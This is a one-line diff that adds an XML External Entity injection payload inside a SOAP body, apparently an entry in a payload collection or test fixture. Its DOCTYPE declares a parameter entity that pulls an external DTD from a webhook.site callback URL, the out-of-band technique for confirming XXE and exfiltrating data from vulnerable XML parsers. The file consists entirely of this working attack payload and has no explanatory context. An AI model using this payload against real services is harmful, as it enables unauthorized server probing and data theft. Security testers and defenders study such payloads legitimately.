@@ -1,0 +1,1 @@
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "https://webhook.site/f01cf93e-a888-41e3-8e5b-a3d3f26b92fb"> %dtd;]><xxx/>]]></foo></soap:Body>
